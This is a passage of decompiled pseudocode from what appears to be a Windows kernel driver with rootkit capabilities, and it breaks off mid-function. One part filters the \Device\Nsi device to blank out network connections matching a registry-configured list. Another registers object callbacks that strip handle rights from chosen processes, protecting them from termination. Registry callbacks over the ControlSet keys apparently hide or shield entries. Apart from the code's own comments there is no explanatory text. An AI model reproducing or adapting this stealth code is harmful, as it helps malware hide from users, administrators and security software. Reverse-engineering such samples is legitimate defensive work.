// Function: sub_1400050C8 at 0x1400050C8
__int64 __fastcall sub_1400050C8(__int64 a1, unsigned __int8 *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx
  unsigned int v4; // r14d
  unsigned __int8 *v5; // rbp
  unsigned __int64 v6; // rsi
  __int64 result; // rax
  unsigned __int64 v9; // rsi

  if ( a3 )
  {
    v3 = a3;
    v4 = *(_DWORD *)a1 & 0x3F;
    v5 = a2;
    v6 = 64 - v4;
    result = (unsigned int)(a3 + *(_DWORD *)a1);
    *(_DWORD *)a1 = result;
    if ( (unsigned int)result < (unsigned int)a3 )
      ++*(_DWORD *)(a1 + 4);
    if ( v4 && a3 >= v6 )
    {
      sub_140007A80(a1 + v4 + 24LL, a2, 64 - v4);
      result = sub_1400046C0((_DWORD *)a1, (unsigned __int8 *)(a1 + 24));
      v5 += v6;
      v3 -= v6;
      v4 = 0;
    }
    if ( v3 >= 0x40 )
    {
      v9 = v3 >> 6;
      v3 += -64LL * (v3 >> 6);
      do
      {
        result = sub_1400046C0((_DWORD *)a1, v5);
        v5 += 64;
        --v9;
      }
      while ( v9 );
    }
    if ( v3 )
      return sub_140007A80(a1 + v4 + 24LL, v5, v3);
  }
  return result;
}


// Function: sub_1400051A4 at 0x1400051A4
__int64 __fastcall sub_1400051A4(__int64 a1, __int64 a2)
{
  if ( (unsigned __int8)sub_1400052BC(&qword_14000A360, a1) )
    return 3221227288LL;
  else
    return sub_1400051EC(&qword_14000A360, a1, a2);
}


// Function: sub_1400051EC at 0x1400051EC
__int64 __fastcall sub_1400051EC(__int64 a1, __int64 a2, _DWORD *a3)
{
  _OWORD *PoolWithTag; // rax
  _OWORD *v8; // rbx
  _QWORD *v9; // rax

  if ( !*(_DWORD *)a2 && !*(_WORD *)(a2 + 4) )
    return 3221225485LL;
  PoolWithTag = ExAllocatePoolWithTag(NonPagedPool, 0x20uLL, 0x4549534Eu);
  v8 = PoolWithTag;
  if ( !PoolWithTag )
    return 3221225626LL;
  *PoolWithTag = 0LL;
  PoolWithTag[1] = 0LL;
  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 16));
  *((_DWORD *)v8 + 4) = (*(_DWORD *)(a1 + 72))++;
  *(_QWORD *)((char *)v8 + 20) = *(_QWORD *)a2;
  v9 = *(_QWORD **)(a1 + 8);
  if ( *v9 != a1 )
    __fastfail(3u);
  *(_QWORD *)v8 = a1;
  *((_QWORD *)v8 + 1) = v9;
  *v9 = v8;
  *(_QWORD *)(a1 + 8) = v8;
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 16));
  *a3 = *((_DWORD *)v8 + 4);
  return 0LL;
}


// Function: sub_1400052B4 at 0x1400052B4
// attributes: thunk
__int64 __fastcall sub_1400052B4(__int64 a1, __int64 a2)
{
  return sub_1400051A4(a1, a2);
}


// Function: sub_1400052BC at 0x1400052BC
char __fastcall sub_1400052BC(__int64 **a1, __int64 a2)
{
  char v3; // bl
  __int64 **i; // rax
  int v6; // edx
  unsigned __int16 v7; // cx
  bool v8; // zf

  v3 = 0;
  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 2));
  for ( i = (__int64 **)*a1; i != a1; i = (__int64 **)*i )
  {
    v6 = *((_DWORD *)i + 5);
    v7 = *((_WORD *)i + 12);
    if ( v6 )
    {
      if ( v7 && *(_WORD *)(a2 + 4) != v7 )
        continue;
      v8 = *(_DWORD *)a2 == v6;
    }
    else
    {
      if ( !v7 )
        continue;
      v8 = *(_WORD *)(a2 + 4) == v7;
    }
    if ( v8 )
    {
      v3 = 1;
      break;
    }
  }
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 2));
  return v3;
}


// Function: sub_14000533C at 0x14000533C
__int64 __fastcall sub_14000533C(struct _DEVICE_OBJECT *a1, IRP *a2)
{
  unsigned int v2; // ebx

  if ( a1 == DeviceObject )
  {
    return (unsigned int)sub_14000556C();
  }
  else
  {
    v2 = 0;
    a2->IoStatus.Information = 0LL;
    a2->IoStatus.Status = 0;
    IofCompleteRequest(a2, 0);
  }
  return v2;
}


// Function: sub_140005374 at 0x140005374
__int64 __fastcall sub_140005374(__int64 a1, __int64 a2, struct _KPROCESS *a3)
{
  __int64 v5; // rdi
  __int64 v6; // r14
  unsigned __int64 v7; // r15
  int v8; // ebp
  __int64 v9; // rsi
  _DWORD *v10; // rdi
  __int64 v11; // rax
  int v13; // [rsp+20h] [rbp-68h] BYREF
  __int16 v14; // [rsp+24h] [rbp-64h]
  struct _KAPC_STATE ApcState; // [rsp+28h] [rbp-60h] BYREF

  if ( *(int *)(a2 + 48) >= 0 )
  {
    v5 = *(_QWORD *)(a2 + 112);
    if ( MmIsAddressValid(*(PVOID *)(v5 + 40)) )
    {
      if ( *(_QWORD *)(v5 + 48) == 56LL )
      {
        v6 = *(_QWORD *)(v5 + 40);
        v7 = *(_QWORD *)(v5 + 104);
        KeStackAttachProcess(a3, &ApcState);
        v8 = 0;
        if ( v7 )
        {
          v9 = 0LL;
          v10 = (_DWORD *)(v6 + 32);
          do
          {
            v14 = *((_WORD *)v10 - 1);
            v13 = *v10;
            if ( sub_1400052BC((__int64 **)&qword_14000A360, (__int64)&v13) )
            {
              v11 = v6 + 56 * v9;
              *(_OWORD *)v11 = 0LL;
              *(_OWORD *)(v11 + 16) = 0LL;
              *(_OWORD *)(v11 + 32) = 0LL;
              *(_QWORD *)(v11 + 48) = 0LL;
            }
            ++v8;
            v10 += 14;
            v9 = v8;
          }
          while ( v8 < v7 );
        }
        KeUnstackDetachProcess(&ApcState);
      }
    }
  }
  if ( *(_BYTE *)(a2 + 65) )
    *(_BYTE *)(*(_QWORD *)(a2 + 184) + 3LL) |= 1u;
  return 0LL;
}


// Function: sub_140005470 at 0x140005470
__int64 __fastcall sub_140005470(__int64 a1, __int64 a2, struct _KPROCESS *a3)
{
  unsigned int *v5; // rdi
  __int64 v6; // r14
  unsigned __int64 v7; // r15
  int v8; // ebp
  __int64 v9; // rsi
  _DWORD *v10; // rdi
  __int64 v11; // rax
  int v13; // [rsp+20h] [rbp-68h] BYREF
  __int16 v14; // [rsp+24h] [rbp-64h]
  struct _KAPC_STATE ApcState; // [rsp+28h] [rbp-60h] BYREF

  if ( *(int *)(a2 + 48) >= 0 )
  {
    v5 = *(unsigned int **)(a2 + 112);
    if ( MmIsAddressValid((PVOID)v5[6]) )
    {
      if ( v5[7] == 56 )
      {
        v6 = v5[6];
        v7 = v5[14];
        KeStackAttachProcess(a3, &ApcState);
        v8 = 0;
        if ( v7 )
        {
          v9 = 0LL;
          v10 = (_DWORD *)(v6 + 32);
          do
          {
            v14 = *((_WORD *)v10 - 1);
            v13 = *v10;
            if ( sub_1400052BC((__int64 **)&qword_14000A360, (__int64)&v13) )
            {
              v11 = v6 + 56 * v9;
              *(_OWORD *)v11 = 0LL;
              *(_OWORD *)(v11 + 16) = 0LL;
              *(_OWORD *)(v11 + 32) = 0LL;
              *(_QWORD *)(v11 + 48) = 0LL;
            }
            ++v8;
            v10 += 14;
            v9 = v8;
          }
          while ( v8 < v7 );
        }
        KeUnstackDetachProcess(&ApcState);
      }
    }
  }
  if ( *(_BYTE *)(a2 + 65) )
    *(_BYTE *)(*(_QWORD *)(a2 + 184) + 3LL) |= 1u;
  return 0LL;
}


// Function: sub_14000556C at 0x14000556C
NTSTATUS __fastcall sub_14000556C(__int64 a1, IRP *a2)
{
  struct _IO_STACK_LOCATION *CurrentStackLocation; // rax
  IRP *v3; // rbx
  ULONG Options; // ecx
  PEPROCESS CurrentProcess; // rax
  struct _IO_STACK_LOCATION *v6; // rcx
  __int64 (__fastcall *v7)(__int64, __int64, struct _KPROCESS *); // rcx
  PEPROCESS v8; // rdx
  struct _IO_STACK_LOCATION *v9; // rax
  struct _IO_STACK_LOCATION *v10; // rcx

  CurrentStackLocation = a2->Tail.Overlay.CurrentStackLocation;
  v3 = a2;
  if ( CurrentStackLocation->Parameters.Read.ByteOffset.LowPart != 1179675 )
    goto LABEL_7;
  Options = CurrentStackLocation->Parameters.Create.Options;
  if ( Options != 112 )
  {
    if ( Options == 60 )
    {
      CurrentProcess = IoGetCurrentProcess();
      v10 = v3->Tail.Overlay.CurrentStackLocation;
      *(_OWORD *)&v10[-1].MajorFunction = *(_OWORD *)&v10->MajorFunction;
      *(_OWORD *)&v10[-1].Parameters.NotifyDirectoryEx.CompletionFilter = *(_OWORD *)&v10->Parameters.NotifyDirectoryEx.CompletionFilter;
      *(_OWORD *)(&v10[-1].Parameters.SetQuota + 6) = *(_OWORD *)(&v10->Parameters.SetQuota + 6);
      v10[-1].FileObject = v10->FileObject;
      v10[-1].Control = 0;
      v7 = sub_140005470;
      goto LABEL_4;
    }
LABEL_7:
    ++a2->CurrentLocation;
    a2->Tail.Overlay.CurrentStackLocation = CurrentStackLocation + 1;
    return IofCallDriver(AttachedToDeviceObject, a2);
  }
  CurrentProcess = IoGetCurrentProcess();
  v6 = v3->Tail.Overlay.CurrentStackLocation;
  *(_OWORD *)&v6[-1].MajorFunction = *(_OWORD *)&v6->MajorFunction;
  *(_OWORD *)&v6[-1].Parameters.NotifyDirectoryEx.CompletionFilter = *(_OWORD *)&v6->Parameters.NotifyDirectoryEx.CompletionFilter;
  *(_OWORD *)(&v6[-1].Parameters.SetQuota + 6) = *(_OWORD *)(&v6->Parameters.SetQuota + 6);
  v6[-1].FileObject = v6->FileObject;
  v6[-1].Control = 0;
  v7 = sub_140005374;
LABEL_4:
  v8 = CurrentProcess;
  v9 = v3->Tail.Overlay.CurrentStackLocation;
  v9[-1].CompletionRoutine = (PIO_COMPLETION_ROUTINE)v7;
  v9[-1].Context = v8;
  a2 = v3;
  v9[-1].Control = -32;
  return IofCallDriver(AttachedToDeviceObject, a2);
}


// Function: sub_140005648 at 0x140005648
NTSTATUS __fastcall sub_140005648(PDRIVER_OBJECT DriverObject)
{
  NTSTATUS result; // eax
  NTSTATUS v3; // edi
  struct _UNICODE_STRING DestinationString; // [rsp+40h] [rbp-18h] BYREF
  PFILE_OBJECT FileObject; // [rsp+68h] [rbp+10h] BYREF

  FileObject = 0LL;
  RtlInitUnicodeString(&DestinationString, L"\\Device\\Nsi");
  result = IoGetDeviceObjectPointer(&DestinationString, 0x1F01FFu, &FileObject, &Object);
  if ( result >= 0 )
  {
    ObfDereferenceObject(FileObject);
    memset64(DriverObject->MajorFunction, (unsigned __int64)sub_14000533C, 0x1BuLL);
    result = IoCreateDevice(DriverObject, 0, 0LL, 0x22u, 0, 0, &DeviceObject);
    if ( result >= 0 )
    {
      DeviceObject->Flags |= 0x10u;
      v3 = IoAttachDeviceToDeviceStackSafe(DeviceObject, Object, &AttachedToDeviceObject);
      if ( v3 < 0 || !AttachedToDeviceObject )
      {
        if ( DeviceObject )
        {
          IoDeleteDevice(DeviceObject);
          DeviceObject = 0LL;
        }
        if ( Object )
        {
          ObfDereferenceObject(Object);
          Object = 0LL;
        }
      }
      return v3;
    }
  }
  return result;
}


// Function: sub_140005754 at 0x140005754
NTSTATUS __fastcall sub_140005754(PDRIVER_OBJECT DriverObject, __int64 a2)
{
  _WORD *v4; // rbx
  int v5; // edi
  NTSTATUS result; // eax
  NTSTATUS v7; // ebx
  char v8; // [rsp+60h] [rbp+18h] BYREF

  dword_14000A370 = 1;
  qword_14000A378 = 0LL;
  dword_14000A380 = 0;
  qword_14000A368 = (__int64)&qword_14000A360;
  qword_14000A360 = (__int64)&qword_14000A360;
  KeInitializeEvent(&Event, SynchronizationEvent, 0);
  dword_14000A3A8 = 1;
  v4 = &unk_14000A2A8;
  v5 = 0;
  while ( v4[2] || *(_DWORD *)v4 )
  {
    sub_1400051A4((__int64)&unk_14000A2A8 + 8 * v5++, (__int64)&v8);
    v4 += 4;
  }
  sub_140005838(a2);
  result = sub_140005648(DriverObject);
  v7 = result;
  if ( result >= 0 )
  {
    byte_14000A2A0 = 1;
  }
  else
  {
    sub_140005900(&qword_14000A360);
    return v7;
  }
  return result;
}


// Function: sub_140005838 at 0x140005838
__int64 __fastcall sub_140005838(__int64 a1)
{
  wchar_t *v1; // rcx
  unsigned int v2; // eax
  __int16 v3; // bx
  unsigned __int16 v4; // si
  const wchar_t *v5; // rdi
  int v6; // eax
  __int16 v7; // dx
  const wchar_t *v9; // [rsp+20h] [rbp-10h] BYREF
  unsigned int v10; // [rsp+68h] [rbp+38h] BYREF
  char v11; // [rsp+70h] [rbp+40h] BYREF
  __int64 v12; // [rsp+78h] [rbp+48h] BYREF

  v9 = 0LL;
  v10 = 0;
  if ( (int)sub_140001AE8(a1, L"Parameters6", &v9, &v10) < 0 )
    return 0LL;
  if ( v10 >= 0x24 )
  {
    v1 = (wchar_t *)v9;
    v2 = v10 - 2;
    v10 -= 2;
    v3 = 0;
    v4 = *v9;
    v5 = v9 + 1;
    if ( !*v9 )
      goto LABEL_11;
    while ( v2 >= 0x22 )
    {
      v12 = 0LL;
      v10 = v2 - 34;
      v6 = sub_140004440(v5);
      v7 = *((unsigned __int8 *)v5 + 33) | (unsigned __int16)(v5[16] << 8);
      LODWORD(v12) = v6;
      WORD2(v12) = v7;
      if ( v6 || v7 )
      {
        sub_1400051A4((__int64)&v12, (__int64)&v11);
        v5 += 17;
      }
      if ( (unsigned __int16)++v3 >= v4 )
        break;
      v2 = v10;
    }
  }
  v1 = (wchar_t *)v9;
LABEL_11:
  if ( v1 )
    sub_140001DD4(v1);
  return 0LL;
}


// Function: sub_140005900 at 0x140005900
__int64 __fastcall sub_140005900(__int64 a1)
{
  _QWORD *v2; // rdi
  __int64 v3; // rdx
  _QWORD *v4; // rcx
  _QWORD *v5; // rax

  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 16));
  v2 = *(_QWORD **)a1;
  while ( v2 != (_QWORD *)a1 )
  {
    v3 = *v2;
    v4 = v2;
    v2 = (_QWORD *)v3;
    if ( *(_QWORD **)(v3 + 8) != v4 || (v5 = (_QWORD *)v4[1], (_QWORD *)*v5 != v4) )
      __fastfail(3u);
    *v5 = v3;
    *(_QWORD *)(v3 + 8) = v5;
    ExFreePoolWithTag(v4, 0x4549534Eu);
  }
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 16));
  return 0LL;
}


// Function: sub_140005974 at 0x140005974
__int64 __fastcall sub_140005974(__int64 a1, __int64 a2)
{
  if ( (unsigned __int8)sub_140005A9C(&qword_14000A300, a1) )
    return 3221227288LL;
  else
    return sub_1400059BC(&qword_14000A300, a1, a2);
}


// Function: sub_1400059BC at 0x1400059BC
__int64 __fastcall sub_1400059BC(__int64 a1, char *a2, _DWORD *a3)
{
  char *v4; // rdi
  _OWORD *PoolWithTag; // rax
  _OWORD *v8; // rbx
  __int64 v9; // rdx
  char v10; // al
  _QWORD *v11; // rax

  v4 = a2;
  if ( !a2 )
    return 3221225485LL;
  PoolWithTag = ExAllocatePoolWithTag(NonPagedPool, 0x38uLL, 0x4548424Fu);
  v8 = PoolWithTag;
  if ( !PoolWithTag )
    return 3221225626LL;
  *PoolWithTag = 0LL;
  PoolWithTag[1] = 0LL;
  PoolWithTag[2] = 0LL;
  *((_QWORD *)PoolWithTag + 6) = 0LL;
  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 16));
  *((_DWORD *)v8 + 4) = (*(_DWORD *)(a1 + 72))++;
  v9 = (char *)v8 + 20 - v4;
  do
  {
    v10 = *v4;
    v4[v9] = *v4;
    ++v4;
  }
  while ( v10 );
  strlwr((char *)v8 + 20);
  v11 = *(_QWORD **)(a1 + 8);
  if ( *v11 != a1 )
    __fastfail(3u);
  *(_QWORD *)v8 = a1;
  *((_QWORD *)v8 + 1) = v11;
  *v11 = v8;
  *(_QWORD *)(a1 + 8) = v8;
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 16));
  *a3 = *((_DWORD *)v8 + 4);
  return 0LL;
}


// Function: sub_140005A9C at 0x140005A9C
char __fastcall sub_140005A9C(__int64 **a1, const char *a2)
{
  char v3; // di
  const char *i; // rbx
  char String[16]; // [rsp+20h] [rbp-48h] BYREF
  __int128 v7; // [rsp+30h] [rbp-38h]

  v3 = 0;
  *(_OWORD *)String = 0LL;
  v7 = 0LL;
  strcpy_s(String, 0x20uLL, a2);
  strlwr(String);
  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 2));
  for ( i = (const char *)*a1; i != (const char *)a1; i = *(const char **)i )
  {
    if ( strstr(i + 20, String) )
    {
      v3 = 1;
      break;
    }
  }
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 2));
  return v3;
}


// Function: sub_140005B3C at 0x140005B3C
NTSTATUS __fastcall sub_140005B3C(__int64 a1, __int64 a2)
{
  __int64 (__fastcall *v4)(); // rdx
  __int64 i; // rax
  __int64 v6; // rcx
  __int64 v7; // rdi
  int v8; // esi
  NTSTATUS result; // eax
  NTSTATUS v10; // ebx
  struct _OB_CALLBACK_REGISTRATION DestinationString; // [rsp+20h] [rbp-E0h] BYREF
  POBJECT_TYPE *v12; // [rsp+50h] [rbp-B0h] BYREF
  __int128 v13; // [rsp+58h] [rbp-A8h]
  __int64 v14; // [rsp+68h] [rbp-98h]
  POBJECT_TYPE *v15; // [rsp+70h] [rbp-90h]
  __int128 v16; // [rsp+78h] [rbp-88h]
  __int64 v17; // [rsp+88h] [rbp-78h]
  _OSVERSIONINFOW VersionInformation; // [rsp+90h] [rbp-70h] BYREF

  dword_14000A310 = 1;
  qword_14000A318 = 0LL;
  dword_14000A320 = 0;
  v14 = 0LL;
  v17 = 0LL;
  qword_14000A308 = (__int64)&qword_14000A300;
  qword_14000A300 = (__int64)&qword_14000A300;
  v13 = 0LL;
  v16 = 0LL;
  memset(&DestinationString, 0, sizeof(DestinationString));
  KeInitializeEvent(&stru_14000A328, SynchronizationEvent, 0);
  dword_14000A348 = 1;
  sub_140005D08(a2);
  sub_140007D40(&VersionInformation.dwMajorVersion, 0LL, 280LL);
  VersionInformation.dwOSVersionInfoSize = 284;
  RtlGetVersion(&VersionInformation);
  v4 = sub_140005DA4;
  if ( VersionInformation.dwMajorVersion > 6 )
    v4 = sub_140005E0C;
  for ( i = *(_QWORD *)(a1 + 8); i; i = *(_QWORD *)(i + 16) )
  {
    v6 = *(_QWORD *)(i + 64);
    if ( v6 )
    {
      if ( !*(_DWORD *)v6 )
      {
        **(_QWORD **)(v6 + 24) = v4;
        v4 = *(__int64 (__fastcall **)())(v6 + 32);
      }
      break;
    }
  }
  LODWORD(v13) = v13 | 3;
  LODWORD(v16) = v16 | 3;
  v12 = PsProcessType;
  *((_QWORD *)&v13 + 1) = v4;
  *((_QWORD *)&v16 + 1) = v4;
  v15 = PsThreadType;
  RtlInitUnicodeString(&DestinationString.Altitude, L"1000");
  v7 = *(_QWORD *)(a1 + 40);
  DestinationString.RegistrationContext = 0LL;
  DestinationString.OperationRegistration = (OB_OPERATION_REGISTRATION *)&v12;
  *(_DWORD *)&DestinationString.Version = 131328;
  v8 = *(_DWORD *)(v7 + 104);
  *(_DWORD *)(v7 + 104) = v8 | 0x20;
  result = ObRegisterCallbacks(&DestinationString, &RegistrationHandle);
  v10 = result;
  if ( result >= 0 )
  {
    *(_DWORD *)(v7 + 104) = v8;
    byte_14000A2D0 = 1;
  }
  else
  {
    sub_140005E98(&qword_14000A300);
    return v10;
  }
  return result;
}


// Function: sub_140005D08 at 0x140005D08
__int64 __fastcall sub_140005D08(__int64 a1)
{
  void *v1; // rcx
  unsigned int v2; // eax
  __int16 v3; // di
  unsigned __int16 v4; // si
  __int64 v5; // rbx
  unsigned int v7; // [rsp+48h] [rbp+10h] BYREF
  char v8; // [rsp+50h] [rbp+18h] BYREF
  _WORD *v9; // [rsp+58h] [rbp+20h] BYREF

  v9 = 0LL;
  v7 = 0;
  if ( (int)sub_140001AE8(a1, L"Parameters7", &v9, &v7) < 0 )
    return 0LL;
  if ( v7 >= 0x22 )
  {
    v1 = v9;
    v2 = v7 - 2;
    v7 -= 2;
    v3 = 0;
    v4 = *v9;
    v5 = (__int64)(v9 + 1);
    if ( !*v9 )
      goto LABEL_8;
    while ( v2 >= 0x20 )
    {
      v7 = v2 - 32;
      sub_140005974(v5, (__int64)&v8);
      v5 += 32LL;
      if ( (unsigned __int16)++v3 >= v4 )
        break;
      v2 = v7;
    }
  }
  v1 = v9;
LABEL_8:
  if ( v1 )
    sub_140001DD4(v1);
  return 0LL;
}


// Function: sub_140005DA4 at 0x140005DA4
__int64 __fastcall sub_140005DA4(__int64 a1, __int64 a2)
{
  POBJECT_TYPE *v3; // rcx
  PEPROCESS v4; // rax
  const char *ProcessImageFileName; // rax

  v3 = *(POBJECT_TYPE **)(a2 + 16);
  if ( v3 == PsThreadType )
  {
    v4 = IoThreadToProcess(*(PETHREAD *)(a2 + 8));
  }
  else
  {
    if ( v3 != PsProcessType )
      return 0LL;
    v4 = *(PEPROCESS *)(a2 + 8);
  }
  ProcessImageFileName = (const char *)PsGetProcessImageFileName(v4);
  if ( sub_140005A9C((__int64 **)&qword_14000A300, ProcessImageFileName) && *(_DWORD *)a2 == 1 )
    **(_DWORD **)(a2 + 32) &= ~1u;
  return 0LL;
}


// Function: sub_140005E0C at 0x140005E0C
__int64 __fastcall sub_140005E0C(__int64 a1, __int64 a2)
{
  POBJECT_TYPE *v3; // rcx
  PEPROCESS v4; // rax
  const char *ProcessImageFileName; // rax
  _DWORD *v6; // rdx
  int v7; // ecx

  v3 = *(POBJECT_TYPE **)(a2 + 16);
  if ( v3 == PsThreadType )
  {
    v4 = IoThreadToProcess(*(PETHREAD *)(a2 + 8));
  }
  else
  {
    if ( v3 != PsProcessType )
      return 0LL;
    v4 = *(PEPROCESS *)(a2 + 8);
  }
  ProcessImageFileName = (const char *)PsGetProcessImageFileName(v4);
  if ( sub_140005A9C((__int64 **)&qword_14000A300, ProcessImageFileName) && *(_DWORD *)a2 == 1 )
  {
    v6 = *(_DWORD **)(a2 + 32);
    v7 = v6[1];
    if ( ((v7 - 1) & 0xFFFFEBFF) == 0 && v7 != 1025 )
      *v6 = 0;
    if ( v7 == 4161 )
      **(_DWORD **)(a2 + 32) = 2031616;
  }
  return 0LL;
}


// Function: sub_140005E98 at 0x140005E98
__int64 __fastcall sub_140005E98(__int64 a1)
{
  _QWORD *v2; // rdi
  __int64 v3; // rdx
  _QWORD *v4; // rcx
  _QWORD *v5; // rax

  ExAcquireFastMutex((PFAST_MUTEX)(a1 + 16));
  v2 = *(_QWORD **)a1;
  while ( v2 != (_QWORD *)a1 )
  {
    v3 = *v2;
    v4 = v2;
    v2 = (_QWORD *)v3;
    if ( *(_QWORD **)(v3 + 8) != v4 || (v5 = (_QWORD *)v4[1], (_QWORD *)*v5 != v4) )
      __fastfail(3u);
    *v5 = v3;
    *(_QWORD *)(v3 + 8) = v5;
    ExFreePoolWithTag(v4, 0x4548424Fu);
  }
  ExReleaseFastMutex((PFAST_MUTEX)(a1 + 16));
  return 0LL;
}


// Function: sub_140005F0C at 0x140005F0C
__int64 __fastcall sub_140005F0C(
        __int64 a1,
        const UNICODE_STRING *a2,
        unsigned int a3,
        __int64 (__fastcall *a4)(__int64, struct _UNICODE_STRING *, __int64 *, _QWORD))
{
  PWSTR *p_Buffer; // rdi
  unsigned __int64 Length; // rbx
  unsigned __int64 v10; // rsi
  WCHAR *PoolWithTag; // rax
  USHORT v12; // dx
  __int64 result; // rax
  PWSTR v14; // rax
  int v15; // ebx
  __int64 v16; // [rsp+20h] [rbp-40h] BYREF
  struct _UNICODE_STRING v17; // [rsp+28h] [rbp-38h] BYREF
  struct _UNICODE_STRING DestinationString; // [rsp+38h] [rbp-28h] BYREF
  __int128 v19; // [rsp+48h] [rbp-18h] BYREF

  DestinationString = 0LL;
  *(_DWORD *)(&v17.MaximumLength + 1) = 0;
  v19 = 0LL;
  v16 = 0LL;
  RtlInitUnicodeString(&DestinationString, L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet");
  if ( !RtlPrefixUnicodeString(&DestinationString, a2, 1u) )
    return 0LL;
  p_Buffer = &a2->Buffer;
  Length = a2->Length;
  v10 = DestinationString.Length + 2LL;
  if ( Length >= v10 && (*p_Buffer)[(unsigned __int64)DestinationString.Length >> 1] != 92 )
    return 0LL;
  PoolWithTag = (WCHAR *)ExAllocatePoolWithTag(NonPagedPool, a2->Length, 0x46526C46u);
  v12 = a2->Length;
  v17.Buffer = PoolWithTag;
  v17.Length = 0;
  v17.MaximumLength = v12;
  if ( !PoolWithTag )
    return 3221225495LL;
  if ( Length < v10 )
  {
    RtlInitUnicodeString(&v17, L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001");
  }
  else
  {
    v14 = *p_Buffer;
    LOWORD(v19) = v12 - DestinationString.Length - 2;
    WORD1(v19) = v19;
    *((_QWORD *)&v19 + 1) = &v14[((unsigned __int64)DestinationString.Length >> 1) + 1];
    sub_140006A44(&v17, L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\%wZ", &v19);
  }
  result = a4(a1, &v17, &v16, a3);
  if ( (int)result >= 0 )
  {
    if ( Length < v10 )
      RtlInitUnicodeString(&v17, L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet002");
    else
      sub_140006A44(&v17, L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet002\\%wZ", &v19);
    v15 = a4(a1, &v17, (__int64 *)((char *)&v16 + 4), a3);
    if ( v15 < 0 )
    {
      sub_140002E5C(a1, v16);
      return (unsigned int)v15;
    }
    if ( v17.Buffer )
      ExFreePoolWithTag(v17.Buffer, 0x46526C46u);
    return 0LL;
  }
  return result;
}


// Function: sub_1400060B4 at 0x1400060B4
__int64 __fastcall sub_1400060B4(const UNICODE_STRING *a1, unsigned int *a2)
{
  int v4; // ebx

  v4 = sub_1400029C8((__int64 **)qword_14000A2E0, a1, a2, 0);
  if ( v4 >= 0 )
  {
    v4 = sub_140005F0C(
           qword_14000A2E0,
           a1,
           *a2,
           (__int64 (__fastcall *)(__int64, struct _UNICODE_STRING *, __int64 *, _QWORD))sub_1400029C8);
    if ( v4 < 0 )
      sub_140002E5C(qword_14000A2E0, *a2);
  }
  return (unsigned int)v4;
}


// Function: sub_140006124 at 0x140006124
__int64 __fastcall sub_140006124(const UNICODE_STRING *a1, unsigned int *a2)
{
  int v4; // ebx

  v4 = sub_1400029E4((__int64 **)qword_14000A2E8, a1, a2, 0);
  if ( v4 >= 0 )
  {
    v4 = sub_140005F0C(
           qword_14000A2E8,
           a1,
           *a2,
           (__int64 (__fastcall *)(__int64, struct _UNICODE_STRING *, __int64 *, _QWORD))sub_1400029E4);
    if ( v4 < 0 )
      sub_140002E5C(qword_14000A2E8, *a2);
  }
  return (unsigned int)v4;
}


// Function: sub_140006194 at 0x140006194
// attributes: thunk
__int64 __fastcall sub_140006194(const UNICODE_STRING *a1, unsigned int *a2)
{
  return sub_1400060B4(a1, a2);
}


// Function: sub_14000619C at 0x14000619C
// attributes: thunk
__int64 __fastcall sub_14000619C(const UNICODE_STRING *a1, unsigned int *a2)
{
  return sub_140006124(a1, a2);
}


// Function: sub_1400061A4 at 0x1400061A4
char __fastcall sub_1400061A4(PVOID Object, __int64 a2)
{
  __int64 **v2; // rsi
  char v3; // bl
  bool v4; // cc
  PCUNICODE_STRING ObjectName; // [rsp+38h] [rbp+10h] BYREF

  v2 = (__int64 **)qword_14000A2E0;
  v3 = 0;
  v4 = *(_WORD *)a2 <= 2u;
  ObjectName = 0LL;
  if ( !v4 && **(_WORD **)(a2 + 8) == 92 )
    return sub_140002BA4((__int64 **)qword_14000A2E0, (__m128i *)a2);
  if ( CmCallbackGetKeyObjectID(&Cookie, Object, 0LL, &ObjectName) >= 0 )
    return sub_140002B9C(v2, (__m128i *)ObjectName, (const UNICODE_STRING *)a2);
  return v3;
}


// Function: sub_140006220 at 0x140006220
char __fastcall sub_140006220(PVOID Object, const UNICODE_STRING *a2)
{
  int v4; // [rsp+40h] [rbp+18h] BYREF
  PCUNICODE_STRING ObjectName; // [rsp+48h] [rbp+20h] BYREF

  v4 = 0;
  if ( CmCallbackGetKeyObjectID(&Cookie, Object, 0LL, &ObjectName) >= 0 )
    return sub_140002BAC((__int64 **)qword_14000A2E8, (UNICODE_STRING *)ObjectName, a2, &v4);
  else
    return 0;
}


// Function: sub_140006270 at 0x140006270
__int64 sub_140006270()
{
  __int64 result; // rax
  unsigned int v1; // ebx

  if ( !byte_14000A2D8 )
    return 3221226021LL;
  v1 = CmUnRegisterCallback(Cookie);
  sub_140002C7C((void *)qword_14000A2E0);
  sub_140002C7C((void *)qword_14000A2E8);
  result = v1;
  byte_14000A2D8 = 0;
  return result;
}


// Function: sub_1400062BC at 0x1400062BC
char __fastcall sub_1400062BC(int a1, __int16 *a2, __int64 a3)
{
  __int16 v4; // ax

  if ( a1 )
  {
    if ( a1 != 3 )
      return 0;
    *(_QWORD *)(a3 + 8) = a2 + 2;
    v4 = *a2;
  }
  else
  {
    *(_QWORD *)(a3 + 8) = a2 + 8;
    v4 = a2[6];
  }
  *(_WORD *)(a3 + 2) = v4;
  *(_WORD *)a3 = v4;
  return 1;
}


// Function: sub_1400062F0 at 0x1400062F0
char __fastcall sub_1400062F0(int a1, __int64 a2, __int64 a3)
{
  int v3; // ecx
  __int16 v5; // ax

  if ( a1 )
  {
    v3 = a1 - 1;
    if ( v3 && v3 != 2 )
      return 0;
    *(_QWORD *)(a3 + 8) = a2 + 20;
    v5 = *(_WORD *)(a2 + 16);
  }
  else
  {
    *(_QWORD *)(a3 + 8) = a2 + 12;
    v5 = *(_WORD *)(a2 + 8);
  }
  *(_WORD *)(a3 + 2) = v5;
  *(_WORD *)a3 = v5;
  return 1;
}


// Function: sub_140006328 at 0x140006328
int __fastcall sub_140006328(_QWORD *Driver, __int64 a2)
{
